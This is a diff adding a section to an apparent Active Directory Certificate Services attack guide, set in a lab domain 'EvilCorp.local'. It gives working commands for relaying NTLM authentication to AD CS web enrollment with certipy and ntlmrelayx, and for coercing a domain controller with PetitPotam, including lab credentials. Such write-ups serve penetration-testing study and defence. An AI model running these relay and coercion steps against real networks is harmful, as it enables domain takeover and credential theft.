@@ -312,6 +312,27 @@ certipy req 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilC
 
 AD CS supports several HTTP-based enrollment methods if additional server roles are installed (Certificate enrollment web service):
 
+<p align="center">
+  <img src="https://github.com/RayRRT/ADCS/blob/main/WebEnrollmentRelay.png?raw=true)" />
+</p>
+
+Hot to abuse:
+
+NOTE:
+
+As Dirk-jan comments in his post [NTLM relaying to AD CS](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) the template that can be used depends on the account that is relayed. For a member server or workstation, the template would be “Computer”. For Domain Controllers this template gives an error because a DC is not a regular server and is not a member of “Domain Computers”. So if you’re relaying a DC then the template should be “DomainController” to match
+
+We can do it directly with Certipy, or also with the implementation of AD CS attack in ntlmrelayx.py by ExAndroidDev:
+```
+certipy relay -ca 192.168.217.145
+
+python ntlmrelayx.py -t http://EvilCorp-EVILDC1-CA/certsrv/csertfnsh.asp -smb2support --adcs --template 'Domain Controller'
+```
+Then, all we need is run PetitPotam or dementor for example, to coerce authentication:
+```
+python3 PetitPotam -d EvilCorp.local -u TheHorseman -p EvilCorp3. 192.168.217.145 EVILDC1
+```
+
 <a name="CVE-2022-29623"></a>
 <br></br>
 <h3 align="center" id="heading">CVE-2022-29623:</h3>
